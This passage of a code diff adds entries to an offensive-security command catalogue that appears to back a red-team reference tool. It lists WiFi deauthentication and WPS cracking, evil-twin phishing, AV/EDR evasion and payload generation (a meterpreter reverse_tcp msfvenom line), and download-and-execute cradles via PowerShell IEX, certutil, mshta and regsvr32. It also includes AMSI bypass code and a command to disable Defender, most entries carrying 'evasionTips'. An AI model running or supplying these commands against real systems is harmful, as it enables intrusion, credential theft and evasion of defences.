+            command: 'emailfinder -d {domain}',
+            description: 'Find email addresses associated with a domain',
+            example: 'emailfinder -d example.com',
+            mitreTechnique: 'Gather Victim Identity Information',
+            mitreId: 'T1589.002',
+            riskLevel: 'Low',
+            platform: ['Linux', 'Windows', 'macOS']
+          }
+        ]
+      },
+      {
+        name: 'Certificate Transparency',
+        description: 'Certificate transparency log analysis',
+        commands: [
+          {
+            command: 'curl -s "https://crt.sh/?q=%25.{domain}&output=json" | jq -r ".[].name_value" | sort -u',
+            description: 'Extract subdomains from certificate transparency logs',
+            example: 'curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r ".[].name_value" | sort -u',
+            mitreTechnique: 'Active Scanning',
+            mitreId: 'T1595.001',
+            riskLevel: 'Low',
+            platform: ['Linux', 'macOS'],
+            opsecNotes: 'Passive reconnaissance using public CT logs'
+          },
+          {
+            command: 'certspotter -domain {domain}',
+            description: 'Monitor certificate transparency logs for domain',
+            example: 'certspotter -domain example.com',
+            mitreTechnique: 'Active Scanning',
+            mitreId: 'T1595.001',
+            riskLevel: 'Low',
+            platform: ['Linux', 'Windows', 'macOS']
+          }
+        ]
+      }
+    ]
+  },
+  {
+    name: 'Wireless Attacks',
+    icon: <Wifi className="w-5 h-5" />,
+    description: 'Wireless network penetration testing techniques',
+    subcategories: [
+      {
+        name: 'Advanced WiFi Reconnaissance',
+        description: 'Advanced wireless network discovery and analysis',
+        commands: [
+          {
+            command: 'airodump-ng {interface}',
+            description: 'Monitor wireless networks and capture packets',
+            example: 'airodump-ng wlan0mon',
+            mitreTechnique: 'Network Sniffing',
+            mitreId: 'T1040',
+            riskLevel: 'Medium',
+            platform: ['Linux'],
+            prerequisites: 'Wireless interface in monitor mode',
+            opsecNotes: 'Passive monitoring, low detection risk'
+          },
+          {
+            command: 'iwlist {interface} scan | grep -E "ESSID|Address|Quality"',
+            description: 'Scan for available wireless networks',
+            example: 'iwlist wlan0 scan | grep -E "ESSID|Address|Quality"',
+            mitreTechnique: 'Network Service Discovery',
+            mitreId: 'T1046',
+            riskLevel: 'Low',
+            platform: ['Linux'],
+            opsecNotes: 'Active scanning may be detected by wireless IDS'
+          },
+          {
+            command: 'wash -i {interface}',
+            description: 'Identify WPS-enabled access points',
+            example: 'wash -i wlan0mon',
+            mitreTechnique: 'Network Service Discovery',
+            mitreId: 'T1046',
+            riskLevel: 'Low',
+            platform: ['Linux'],
+            prerequisites: 'Monitor mode interface'
+          },
+          {
+            command: 'kismet -c {interface}',
+            description: 'Advanced wireless network detector and analyzer',
+            example: 'kismet -c wlan0',
+            mitreTechnique: 'Network Sniffing',
+            mitreId: 'T1040',
+            riskLevel: 'Low',
+            platform: ['Linux'],
+            references: ['https://www.kismetwireless.net/']
+          }
+        ]
+      },
+      {
+        name: 'WPA/WPA2 Attacks',
+        description: 'Attacks against WPA/WPA2 encrypted networks',
+        commands: [
+          {
+            command: 'airodump-ng -c {channel} --bssid {bssid} -w {output} {interface}',
+            description: 'Capture handshake from specific access point',
+            example: 'airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w handshake wlan0mon',
+            mitreTechnique: 'Network Sniffing',
+            mitreId: 'T1040',
+            riskLevel: 'Medium',
+            platform: ['Linux'],
+            opsecNotes: 'Passive capture, requires client connection'
+          },
+          {
+            command: 'aireplay-ng -0 {count} -a {bssid} -c {client} {interface}',
+            description: 'Deauthentication attack to force handshake capture',
+            example: 'aireplay-ng -0 10 -a 00:11:22:33:44:55 -c 66:77:88:99:AA:BB wlan0mon',
+            mitreTechnique: 'Network Denial of Service',
+            mitreId: 'T1498.001',
+            riskLevel: 'High',
+            platform: ['Linux'],
+            opsecNotes: 'Active attack, easily detected and may be illegal',
+            evasionTips: 'Use targeted deauth against specific clients'
+          },
+          {
+            command: 'aircrack-ng -w {wordlist} -b {bssid} {capture_file}',
+            description: 'Crack WPA/WPA2 handshake using wordlist',
+            example: 'aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 00:11:22:33:44:55 handshake-01.cap',
+            mitreTechnique: 'Brute Force',
+            mitreId: 'T1110.002',
+            riskLevel: 'Low',
+            platform: ['Linux'],
+            opsecNotes: 'Offline attack, no network interaction'
+          },
+          {
+            command: 'hashcat -m 22000 {hash_file} {wordlist}',
+            description: 'GPU-accelerated WPA/WPA2 cracking',
+            example: 'hashcat -m 22000 handshake.hc22000 /usr/share/wordlists/rockyou.txt',
+            mitreTechnique: 'Brute Force',
+            mitreId: 'T1110.002',
+            riskLevel: 'Low',
+            platform: ['Linux', 'Windows'],
+            prerequisites: 'GPU with OpenCL/CUDA support'
+          }
+        ]
+      },
+      {
+        name: 'WPS Attacks',
+        description: 'WiFi Protected Setup vulnerability exploitation',
+        commands: [
+          {
+            command: 'reaver -i {interface} -b {bssid} -vv',
+            description: 'WPS PIN brute force attack',
+            example: 'reaver -i wlan0mon -b 00:11:22:33:44:55 -vv',
+            mitreTechnique: 'Brute Force',
+            mitreId: 'T1110.001',
+            riskLevel: 'High',
+            platform: ['Linux'],
+            opsecNotes: 'Active attack, generates significant traffic',
+            evasionTips: 'Use delay options to avoid rate limiting'
+          },
+          {
+            command: 'bully -b {bssid} -c {channel} {interface}',
+            description: 'Alternative WPS PIN attack tool',
+            example: 'bully -b 00:11:22:33:44:55 -c 6 wlan0mon',
+            mitreTechnique: 'Brute Force',
+            mitreId: 'T1110.001',
+            riskLevel: 'High',
+            platform: ['Linux']
+          },
+          {
+            command: 'wifite --wps-only --target {bssid}',
+            description: 'Automated WPS attack with Wifite',
+            example: 'wifite --wps-only --target 00:11:22:33:44:55',
+            mitreTechnique: 'Brute Force',
+            mitreId: 'T1110.001',
+            riskLevel: 'High',
+            platform: ['Linux'],
+            references: ['https://github.com/derv82/wifite2']
+          }
+        ]
+      },
+      {
+        name: 'Evil Twin Attacks',
+        description: 'Rogue access point attacks',
+        commands: [
+          {
+            command: 'hostapd {config_file}',
+            description: 'Create rogue access point with hostapd',
+            example: 'hostapd /etc/hostapd/hostapd.conf',
+            mitreTechnique: 'Rogue Wi-Fi Access Points',
+            mitreId: 'T1465',
+            riskLevel: 'Critical',
+            platform: ['Linux'],
+            opsecNotes: 'Highly detectable, may violate regulations',
+            prerequisites: 'Wireless interface capable of AP mode'
+          },
+          {
+            command: 'fluxion',
+            description: 'Automated evil twin attack framework',
+            example: 'fluxion',
+            mitreTechnique: 'Rogue Wi-Fi Access Points',
+            mitreId: 'T1465',
+            riskLevel: 'Critical',
+            platform: ['Linux'],
+            opsecNotes: 'Creates fake captive portal for credential harvesting',
+            references: ['https://github.com/FluxionNetwork/fluxion']
+          },
+          {
+            command: 'wifiphisher -aI {interface} -jI {interface2} -e {essid}',
+            description: 'Automated phishing attack against WiFi users',
+            example: 'wifiphisher -aI wlan0 -jI wlan1 -e "Free WiFi"',
+            mitreTechnique: 'Rogue Wi-Fi Access Points',
+            mitreId: 'T1465',
+            riskLevel: 'Critical',
+            platform: ['Linux'],
+            references: ['https://github.com/wifiphisher/wifiphisher']
+          }
+        ]
+      }
+    ]
+  },
+  {
+    name: 'Mobile Security',
+    icon: <Smartphone className="w-5 h-5" />,
+    description: 'Mobile application and device security testing',
+    subcategories: [
+      {
+        name: 'Android Testing',
+        description: 'Android application security testing techniques',
+        commands: [
+          {
+            command: 'adb devices',
+            description: 'List connected Android devices',
+            mitreTechnique: 'System Information Discovery',
+            mitreId: 'T1082',
+            riskLevel: 'Low',
+            platform: ['Linux', 'Windows', 'macOS'],
+            prerequisites: 'Android Debug Bridge (ADB) installed'
+          },
+          {
+            command: 'adb shell pm list packages',
+            description: 'List all installed packages on Android device',
+            mitreTechnique: 'Software Discovery',
+            mitreId: 'T1518',
+            riskLevel: 'Low',
+            platform: ['Linux', 'Windows', 'macOS']
+          },
+          {
+            command: 'adb pull /data/data/{package_name}/ ./app_data/',
+            description: 'Extract application data from Android device',
+            example: 'adb pull /data/data/com.example.app/ ./app_data/',
+            mitreTechnique: 'Data from Local System',
+            mitreId: 'T1005',
+            riskLevel: 'Medium',
+            platform: ['Linux', 'Windows', 'macOS'],
+            prerequisites: 'Root access or debuggable app'
+          },
+          {
+            command: 'apktool d {apk_file}',
+            description: 'Decompile Android APK file',
+            example: 'apktool d app.apk',
+            mitreTechnique: 'Software Discovery',
+            mitreId: 'T1518.001',
+            riskLevel: 'Low',
+            platform: ['Linux', 'Windows', 'macOS'],
+            references: ['https://ibotpeaches.github.io/Apktool/']
+          },
+          {
+            command: 'jadx -d {output_dir} {apk_file}',
+            description: 'Decompile APK to Java source code',
+            example: 'jadx -d ./decompiled app.apk',
+            mitreTechnique: 'Software Discovery',
+            mitreId: 'T1518.001',
+            riskLevel: 'Low',
+            platform: ['Linux', 'Windows', 'macOS']
+          },
+          {
+            command: 'frida -U -f {package_name} -l {script.js}',
+            description: 'Dynamic analysis with Frida on Android',
+            example: 'frida -U -f com.example.app -l hook_script.js',
+            mitreTechnique: 'Process Injection',
+            mitreId: 'T1055',
+            riskLevel: 'Medium',
+            platform: ['Linux', 'Windows', 'macOS'],
+            prerequisites: 'Frida server running on device'
+          }
+        ]
+      },
+      {
+        name: 'iOS Testing',
+        description: 'iOS application security testing techniques',
+        commands: [
+          {
+            command: 'ideviceinfo',
+            description: 'Get iOS device information',
+            mitreTechnique: 'System Information Discovery',
+            mitreId: 'T1082',
+            riskLevel: 'Low',
+            platform: ['Linux', 'macOS'],
+            prerequisites: 'libimobiledevice installed'
+          },
+          {
+            command: 'ideviceinstaller -l',
+            description: 'List installed applications on iOS device',
+            mitreTechnique: 'Software Discovery',
+            mitreId: 'T1518',
+            riskLevel: 'Low',
+            platform: ['Linux', 'macOS']
+          },
+          {
+            command: 'class-dump -H {binary} -o {output_dir}',
+            description: 'Extract Objective-C class information',
+            example: 'class-dump -H ./App -o ./headers/',
+            mitreTechnique: 'Software Discovery',
+            mitreId: 'T1518.001',
+            riskLevel: 'Low',
+            platform: ['macOS']
+          },
+          {
+            command: 'otool -L {binary}',
+            description: 'List shared libraries used by iOS binary',
+            example: 'otool -L ./App',
+            mitreTechnique: 'Software Discovery',
+            mitreId: 'T1518.001',
+            riskLevel: 'Low',
+            platform: ['macOS']
+          },
+          {
+            command: 'frida -U -f {bundle_id} -l {script.js}',
+            description: 'Dynamic analysis with Frida on iOS',
+            example: 'frida -U -f com.example.app -l hook_script.js',
+            mitreTechnique: 'Process Injection',
+            mitreId: 'T1055',
+            riskLevel: 'Medium',
+            platform: ['Linux', 'Windows', 'macOS'],
+            prerequisites: 'Jailbroken device with Frida installed'
+          }
+        ]
+      },
+      {
+        name: 'Mobile Network Testing',
+        description: 'Mobile network security testing',
+        commands: [
+          {
+            command: 'tcpdump -i any -w mobile_traffic.pcap',
+            description: 'Capture mobile network traffic',
+            mitreTechnique: 'Network Sniffing',
+            mitreId: 'T1040',
+            riskLevel: 'Medium',
+            platform: ['Linux'],
+            prerequisites: 'Root access on device'
+          },
+          {
+            command: 'mitmproxy --mode transparent --showhost',
+            description: 'Intercept mobile HTTPS traffic',
+            mitreTechnique: 'Adversary-in-the-Middle',
+            mitreId: 'T1557',
+            riskLevel: 'High',
+            platform: ['Linux', 'Windows', 'macOS'],
+            prerequisites: 'Certificate installed on mobile device'
+          },
+          {
+            command: 'objection -g {package_name} explore',
+            description: 'Runtime mobile application security testing',
+            example: 'objection -g com.example.app explore',
+            mitreTechnique: 'Process Injection',
+            mitreId: 'T1055',
+            riskLevel: 'Medium',
+            platform: ['Linux', 'Windows', 'macOS'],
+            references: ['https://github.com/sensepost/objection']
+          }
+        ]
+      }
+    ]
+  },
+  {
+    name: 'Evasion Techniques',
+    icon: <Skull className="w-5 h-5" />,
+    description: 'Anti-detection and evasion techniques',
+    subcategories: [
+      {
+        name: 'AV Evasion',
+        description: 'Antivirus and EDR evasion techniques',
+        commands: [
+          {
+            command: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -e x86/shikata_ga_nai -i 10 -f exe > payload.exe',
+            description: 'Generate encoded payload to evade AV',
+            example: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe > payload.exe',
+            mitreTechnique: 'Obfuscated Files or Information',
+            mitreId: 'T1027',
+            riskLevel: 'High',
+            platform: ['Linux', 'Windows', 'macOS'],
+            opsecNotes: 'Multiple encoding iterations may still be detected',
+            evasionTips: 'Use custom encoders, combine with packers, avoid common payloads'
+          },
+          {
+            command: 'veil -t Evasion -p go/meterpreter/rev_tcp.py',
+            description: 'Generate AV-evasive payload with Veil',
+            mitreTechnique: 'Obfuscated Files or Information',
+            mitreId: 'T1027',
+            riskLevel: 'High',
+            platform: ['Linux'],
+            references: ['https://github.com/Veil-Framework/Veil'],
+            evasionTips: 'Use Go/Rust payloads, less signatured than C/C++'
+          },
+          {
+            command: 'python3 Invoke-Obfuscation.py -f {powershell_script}',
+            description: 'Obfuscate PowerShell scripts',
+            example: 'python3 Invoke-Obfuscation.py -f payload.ps1',
+            mitreTechnique: 'Obfuscated Files or Information',
+            mitreId: 'T1027.006',
+            riskLevel: 'Medium',
+            platform: ['Linux', 'Windows', 'macOS'],
+            evasionTips: 'Use multiple obfuscation layers, avoid common patterns'
+          },
+          {
+            command: 'upx --best {executable}',
+            description: 'Pack executable to evade signature detection',
+            example: 'upx --best payload.exe',
+            mitreTechnique: 'Software Packing',
+            mitreId: 'T1027.002',
+            riskLevel: 'Medium',
+            platform: ['Linux', 'Windows', 'macOS'],
+            opsecNotes: 'UPX packing is commonly detected by modern AV',
+            evasionTips: 'Use custom packers like Themida, VMProtect, or write your own'
+          },
+          {
+            command: 'donut -f {format} -a {arch} {payload}',
+            description: 'Generate position-independent shellcode with Donut',
+            example: 'donut -f 1 -a 2 payload.exe',
+            mitreTechnique: 'Reflective Code Loading',
+            mitreId: 'T1620',
+            riskLevel: 'High',
+            platform: ['Linux', 'Windows'],
+            opsecNotes: 'In-memory execution, harder to detect on disk',
+            evasionTips: 'Combine with process hollowing or DLL injection',
+            references: ['https://github.com/TheWover/donut']
+          },
+          {
+            command: 'ScareCrow -I {payload.bin} -Loader dll -domain {domain}',
+            description: 'Generate EDR-evasive payloads with ScareCrow',
+            example: 'ScareCrow -I payload.bin -Loader dll -domain microsoft.com',
+            mitreTechnique: 'Masquerading',
+            mitreId: 'T1036.005',
+            riskLevel: 'High',
+            platform: ['Linux', 'Windows'],
+            opsecNotes: 'Uses legitimate certificates and domains for evasion',
+            evasionTips: 'Use real company domains, vary loader types',
+            references: ['https://github.com/optiv/ScareCrow']
+          },
+          {
+            command: 'python3 avet.py -f {payload} --encode_to_exe --avoid_av',
+            description: 'AntiVirus Evasion Tool (AVET) for payload generation',
+            example: 'python3 avet.py -f payload.exe --encode_to_exe --avoid_av',
+            mitreTechnique: 'Obfuscated Files or Information',
+            mitreId: 'T1027',
+            riskLevel: 'High',
+            platform: ['Linux'],
+            evasionTips: 'Use multiple evasion techniques, test against target AV',
+            references: ['https://github.com/govolution/avet']
+          },
+          {
+            command: 'python3 phantom-evasion.py --setup',
+            description: 'Phantom-Evasion framework for AV bypass',
+            mitreTechnique: 'Obfuscated Files or Information',
+            mitreId: 'T1027',
+            riskLevel: 'High',
+            platform: ['Linux'],
+            evasionTips: 'Use crypters and multiple encoding layers',
+            references: ['https://github.com/oddcod3/Phantom-Evasion']
+          }
+        ]
+      },
+      {
+        name: 'Network Evasion',
+        description: 'Network-level evasion and steganography',
+        commands: [
+          {
+            command: 'nmap -sS -T1 -f --data-length 200 {target}',
+            description: 'Stealth SYN scan with fragmentation and timing evasion',
+            example: 'nmap -sS -T1 -f --data-length 200 192.168.1.1',
+            mitreTechnique: 'Network Service Discovery',
+            mitreId: 'T1046',
+            riskLevel: 'Low',
+            platform: ['Linux', 'Windows', 'macOS'],
+            opsecNotes: 'Slow scan to avoid detection, may take hours',
+            evasionTips: 'Use decoy IPs (-D), source port spoofing (--source-port)'
+          },
+          {
+            command: 'hping3 -S -p {port} -c 1 --tcp-timestamp --id +1 {target}',
+            description: 'Custom TCP packet crafting for evasion',
+            example: 'hping3 -S -p 80 -c 1 --tcp-timestamp --id +1 192.168.1.1',
+            mitreTechnique: 'Network Service Discovery',
+            mitreId: 'T1046',
+            riskLevel: 'Low',
+            platform: ['Linux'],
+            evasionTips: 'Randomize packet timing, use legitimate source ports'
+          },
+          {
+            command: 'nmap -sI {zombie_host} {target}',
+            description: 'Idle scan using zombie host for IP spoofing',
+            example: 'nmap -sI 192.168.1.50 192.168.1.1',
+            mitreTechnique: 'Network Service Discovery',
+            mitreId: 'T1046',
+            riskLevel: 'Medium',
+            platform: ['Linux', 'Windows', 'macOS'],
+            opsecNotes: 'Requires finding suitable zombie host with predictable IP ID',
+            evasionTips: 'Use multiple zombie hosts, verify zombie suitability first'
+          },
+          {
+            command: 'proxychains4 -f /etc/proxychains4.conf {command}',
+            description: 'Route traffic through proxy chains for anonymity',
+            example: 'proxychains4 -f /etc/proxychains4.conf nmap -sT 192.168.1.1',
+            mitreTechnique: 'Proxy',
+            mitreId: 'T1090',
+            riskLevel: 'Medium',
+            platform: ['Linux'],
+            evasionTips: 'Use SOCKS5 proxies, rotate proxy chains regularly',
+            prerequisites: 'Configured proxy chain in proxychains4.conf'
+          },
+          {
+            command: 'tor --SocksPort 9050 --ControlPort 9051',
+            description: 'Route traffic through Tor network',
+            mitreTechnique: 'Proxy',
+            mitreId: 'T1090.003',
+            riskLevel: 'Medium',
+            platform: ['Linux', 'Windows', 'macOS'],
+            opsecNotes: 'Tor exit nodes may be monitored or blocked',
+            evasionTips: 'Use bridges, change circuits frequently'
+          },
+          {
+            command: 'scapy -c "send(IP(dst=\\"{target}\\")/TCP(dport={port},flags=\\"S\\"))"',
+            description: 'Custom packet crafting with Scapy',
+            example: 'scapy -c "send(IP(dst=\\"192.168.1.1\\")/TCP(dport=80,flags=\\"S\\"))"',
+            mitreTechnique: 'Network Service Discovery',
+            mitreId: 'T1046',
+            riskLevel: 'Low',
+            platform: ['Linux', 'Windows', 'macOS'],
+            evasionTips: 'Craft packets to mimic legitimate traffic patterns'
+          },
+          {
+            command: 'dnscat2-client {domain}',
+            description: 'DNS tunneling for covert communication',
+            example: 'dnscat2-client tunnel.example.com',
+            mitreTechnique: 'Protocol Tunneling',
+            mitreId: 'T1572',
+            riskLevel: 'High',
+            platform: ['Linux', 'Windows', 'macOS'],
+            opsecNotes: 'DNS queries may be logged and analyzed',
+            evasionTips: 'Use legitimate-looking domain names, vary query patterns',
+            references: ['https://github.com/iagox86/dnscat2']
+          },
+          {
+            command: 'iodine -f -P {password} {subdomain}.{domain}',
+            description: 'DNS tunneling with iodine',
+            example: 'iodine -f -P mypassword tunnel.example.com',
+            mitreTechnique: 'Protocol Tunneling',
+            mitreId: 'T1572',
+            riskLevel: 'High',
+            platform: ['Linux', 'macOS'],
+            evasionTips: 'Use subdomains of legitimate domains',
+            references: ['https://github.com/yarrick/iodine']
+          },
+          {
+            command: 'proxychains4 -f /etc/proxychains4.conf {command}',
+            description: 'Route traffic through proxy chains',
+            example: 'proxychains4 -f /etc/proxychains4.conf nmap -sT 192.168.1.1',
+            mitreTechnique: 'Proxy',
+            mitreId: 'T1090',
+            riskLevel: 'Low',
+            platform: ['Linux'],
+            opsecNotes: 'Helps hide source IP but may introduce latency'
+          },
+          {
+            command: 'tor --SocksPort 9050 --ControlPort 9051',
+            description: 'Route traffic through Tor network',
+            mitreTechnique: 'Proxy',
+            mitreId: 'T1090.003',
+            riskLevel: 'Low',
+            platform: ['Linux', 'Windows', 'macOS'],
+            opsecNotes: 'Provides anonymity but Tor traffic may be blocked'
+          }
+        ]
+      },
+      {
+        name: 'Living Off The Land',
+        description: 'Using legitimate system tools for malicious purposes',
+        commands: [
+          {
+            command: 'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString(\"{url}\\")"',
+            description: 'Download and execute PowerShell script from web',
+            example: 'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString(\\"https://example.com/script.ps1\\")"',
+            mitreTechnique: 'Command and Scripting Interpreter',
+            mitreId: 'T1059.001',
+            riskLevel: 'High',
+            platform: ['Windows'],
+            opsecNotes: 'PowerShell execution is heavily monitored',
+            evasionTips: 'Use AMSI bypass, obfuscate commands, use alternative download methods'
+          },
+          {
+            command: 'certutil.exe -urlcache -split -f {url} {output_file}',
+            description: 'Download files using Windows certutil',
+            example: 'certutil.exe -urlcache -split -f https://example.com/payload.exe payload.exe',
+            mitreTechnique: 'Ingress Tool Transfer',
+            mitreId: 'T1105',
+            riskLevel: 'Medium',
+            platform: ['Windows'],
+            opsecNotes: 'Certutil downloads are logged in Windows Event Log',
+            evasionTips: 'Use legitimate-looking URLs, delete cache after use'
+          },
+          {
+            command: 'bitsadmin /transfer myDownloadJob /download /priority normal {url} {local_path}',
+            description: 'Download files using Windows BITS service',
+            example: 'bitsadmin /transfer myDownloadJob /download /priority normal https://example.com/file.exe C:\\temp\\file.exe',
+            mitreTechnique: 'BITS Jobs',
+            mitreId: 'T1197',
+            riskLevel: 'Medium',
+            platform: ['Windows'],
+            opsecNotes: 'BITS transfers can be monitored and logged',
+            evasionTips: 'Use legitimate job names, schedule transfers during business hours'
+          },
+          {
+            command: 'mshta.exe javascript:a=GetObject(\\"script:{url}\\").Exec();close()',
+            description: 'Execute JavaScript/VBScript using mshta',
+            example: 'mshta.exe javascript:a=GetObject(\\"script:https://example.com/script.sct\\").Exec();close()',
+            mitreTechnique: 'Signed Binary Proxy Execution',
+            mitreId: 'T1218.005',
+            riskLevel: 'High',
+            platform: ['Windows'],
+            opsecNotes: 'Mshta execution may trigger security alerts',
+            evasionTips: 'Use legitimate-looking script content, obfuscate JavaScript'
+          },
+          {
+            command: 'rundll32.exe javascript:\\"\\..\\mshtml,RunHTMLApplication \\";document.write();GetObject(\\"script:{url}\\").Exec()',
+            description: 'Execute scripts using rundll32 and mshtml',
+            example: 'rundll32.exe javascript:\\"\\..\\mshtml,RunHTMLApplication \\";document.write();GetObject(\\"script:https://example.com/script.sct\\").Exec()',
+            mitreTechnique: 'Signed Binary Proxy Execution',
+            mitreId: 'T1218.011',
+            riskLevel: 'High',
+            platform: ['Windows'],
+            opsecNotes: 'Rundll32 with unusual parameters is suspicious',
+            evasionTips: 'Use common rundll32 parameters as decoys'
+          },
+          {
+            command: 'regsvr32.exe /s /n /u /i:{url} scrobj.dll',
+            description: 'Execute remote scripts using regsvr32',
+            example: 'regsvr32.exe /s /n /u /i:https://example.com/script.sct scrobj.dll',
+            mitreTechnique: 'Signed Binary Proxy Execution',
+            mitreId: 'T1218.010',
+            riskLevel: 'High',
+            platform: ['Windows'],
+            opsecNotes: 'Regsvr32 with remote URLs is highly suspicious',
+            evasionTips: 'Use local files when possible, obfuscate script content'
+          },
+          {
+            command: 'wmic.exe process call create \\"cmd.exe /c {command}\\"',
+            description: 'Execute commands using WMI',
+            example: 'wmic.exe process call create \\"cmd.exe /c powershell.exe -enc {base64_command}\\"',
+            mitreTechnique: 'Windows Management Instrumentation',
+            mitreId: 'T1047',
+            riskLevel: 'Medium',
+            platform: ['Windows'],
+            opsecNotes: 'WMI process creation is logged in Windows Event Log',
+            evasionTips: 'Use WMI for lateral movement, encode commands'
+          },
+          {
+            command: 'forfiles /p C:\\ /m *.exe /c \\"cmd /c echo @path\\"',
+            description: 'File enumeration using forfiles',
+            example: 'forfiles /p C:\\Users /m *.txt /c \\"cmd /c echo @path\\"',
+            mitreTechnique: 'File and Directory Discovery',
+            mitreId: 'T1083',
+            riskLevel: 'Low',
+            platform: ['Windows'],
+            evasionTips: 'Use for legitimate-looking file searches'
+          },
+          {
+            command: 'findstr /s /i password *.txt *.ini *.config',
+            description: 'Search for passwords in files using findstr',
+            example: 'findstr /s /i password C:\\Users\\*\\*.txt',
+            mitreTechnique: 'Unsecured Credentials',
+            mitreId: 'T1552.001',
+            riskLevel: 'Medium',
+            platform: ['Windows'],
+            evasionTips: 'Search in user directories, look for config files'
+          }
+        ]
+      },
+      {
+        name: 'EDR Evasion',
+        description: 'Advanced techniques to bypass Endpoint Detection and Response',
+        commands: [
+          {
+            command: 'python3 EDRSandblast.py --usermode --kernelmode',
+            description: 'Blind EDR sensors using EDRSandblast',
+            mitreTechnique: 'Disable or Modify Tools',
+            mitreId: 'T1562.001',
+            riskLevel: 'Critical',
+            platform: ['Windows'],
+            opsecNotes: 'Extremely aggressive technique, high chance of detection',
+            evasionTips: 'Use only when stealth is not required',
+            references: ['https://github.com/wavestone-cdt/EDRSandblast']
+          },
+          {
+            command: 'python3 SharpEDRChecker.py',
+            description: 'Enumerate EDR products on target system',
+            mitreTechnique: 'Software Discovery',
+            mitreId: 'T1518.001',
+            riskLevel: 'Low',
+            platform: ['Windows'],
+            evasionTips: 'Run early in engagement to plan evasion strategy',
+            references: ['https://github.com/PwnDexter/SharpEDRChecker']
+          },
+          {
+            command: 'sRDI.exe -f {dll_file} -e {export_function}',
+            description: 'Convert DLL to position-independent shellcode',
+            example: 'sRDI.exe -f payload.dll -e DllMain',
+            mitreTechnique: 'Reflective Code Loading',
+            mitreId: 'T1620',
+            riskLevel: 'High',
+            platform: ['Windows'],
+            opsecNotes: 'In-memory execution bypasses many file-based detections',
+            evasionTips: 'Use with process injection techniques',
+            references: ['https://github.com/monoxgas/sRDI']
+          },
+          {
+            command: 'python3 ThreatCheck.py -f {payload_file}',
+            description: 'Identify detection signatures in payloads',
+            example: 'python3 ThreatCheck.py -f payload.exe',
+            mitreTechnique: 'Software Discovery',
+            mitreId: 'T1518.001',
+            riskLevel: 'Low',
+            platform: ['Windows'],
+            evasionTips: 'Use to identify and modify detected code sections',
+            references: ['https://github.com/rasta-mouse/ThreatCheck']
+          },
+          {
+            command: 'python3 DefenderCheck.py {payload_file}',
+            description: 'Check payload against Windows Defender',
+            example: 'python3 DefenderCheck.py payload.exe',
+            mitreTechnique: 'Software Discovery',
+            mitreId: 'T1518.001',
+            riskLevel: 'Low',
+            platform: ['Windows'],
+            evasionTips: 'Iteratively modify payload until clean',
+            references: ['https://github.com/matterpreter/DefenderCheck']
+          },
+          {
+            command: 'Invoke-ReflectivePEInjection -PEPath {exe_file} -ProcessID {pid}',
+            description: 'Reflectively inject PE into process memory',
+            example: 'Invoke-ReflectivePEInjection -PEPath payload.exe -ProcessID 1234',
+            mitreTechnique: 'Process Injection',
+            mitreId: 'T1055.001',
+            riskLevel: 'High',
+            platform: ['Windows'],
+            opsecNotes: 'In-memory execution, no disk artifacts',
+            evasionTips: 'Target legitimate processes, avoid protected processes'
+          },
+          {
+            command: 'python3 ProcessHollowing.py -t {target_process} -p {payload}',
+            description: 'Process hollowing for stealth execution',
+            example: 'python3 ProcessHollowing.py -t notepad.exe -p payload.exe',
+            mitreTechnique: 'Process Injection',
+            mitreId: 'T1055.012',
+            riskLevel: 'High',
+            platform: ['Windows'],
+            opsecNotes: 'Creates legitimate-looking process with malicious code',
+            evasionTips: 'Use common system processes as targets'
+          }
+        ]
+      },
+      {
+        name: 'AMSI Bypass',
+        description: 'Techniques to bypass Anti-Malware Scan Interface',
+        commands: [
+          {
+            command: '[Ref].Assembly.GetType(\\"System.Management.Automation.AmsiUtils\\").GetField(\\"amsiInitFailed\\",\\"NonPublic,Static\\").SetValue($null,$true)',
+            description: 'Classic AMSI bypass via reflection',
+            mitreTechnique: 'Disable or Modify Tools',
+            mitreId: 'T1562.001',
+            riskLevel: 'Medium',
+            platform: ['Windows'],
+            opsecNotes: 'Well-known bypass, may be detected',
+            evasionTips: 'Obfuscate the bypass code, use alternative methods'
+          },
+          {
+            command: '$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like \\"*iUtils\\") {$c=$b}};$d=$c.GetFields(\\"NonPublic,Static\\");Foreach($e in $d) {if ($e.Name -like \\"*Failed\\") {$f=$e}};$f.SetValue($null,$true)',
+            description: 'Obfuscated AMSI bypass',
+            mitreTechnique: 'Disable or Modify Tools',
+            mitreId: 'T1562.001',
+            riskLevel: 'Medium',
+            platform: ['Windows'],
+            evasionTips: 'Further obfuscate variable names and logic'
+          },
+          {
+            command: 'powershell.exe -version 2 -Command "Your-Command-Here"',
+            description: 'Use PowerShell v2 to bypass AMSI (if available)',
+            example: 'powershell.exe -version 2 -Command "IEX (New-Object Net.WebClient).DownloadString(\\"https://example.com/script.ps1\\")"',
+            mitreTechnique: 'Disable or Modify Tools',
+            mitreId: 'T1562.001',
+            riskLevel: 'Medium',
+            platform: ['Windows'],
+            opsecNotes: 'PowerShell v2 lacks AMSI integration',
+            evasionTips: 'Check if PowerShell v2 is available on target',
+            prerequisites: 'PowerShell v2 must be installed'
+          },
+          {
+            command: 'python3 AMSITrigger.py -i {powershell_script}',
+            description: 'Identify AMSI detection triggers in PowerShell',
+            example: 'python3 AMSITrigger.py -i script.ps1',
+            mitreTechnique: 'Disable or Modify Tools',
+            mitreId: 'T1562.001',
+            riskLevel: 'Low',
+            platform: ['Windows'],
+            evasionTips: 'Modify detected strings to bypass AMSI',
+            references: ['https://github.com/RythmStick/AMSITrigger']
+          },
+          {
+            command: 'Set-MpPreference -DisableRealtimeMonitoring $true',
+            description: 'Disable Windows Defender real-time monitoring',
+            mitreTechnique: 'Disable or Modify Tools',
+            mitreId: 'T1562.001',
+            riskLevel: 'Critical',
+            platform: ['Windows'],
+            opsecNotes: 'Requires administrator privileges, highly suspicious',
+            evasionTips: 'Use only when stealth is not required',
+            prerequisites: 'Administrator privileges required'
+          }
+        ]
+      },
+      {
+        name: 'Memory Evasion',
+        description: 'Advanced in-memory evasion and injection techniques',
+        commands: [
+          {
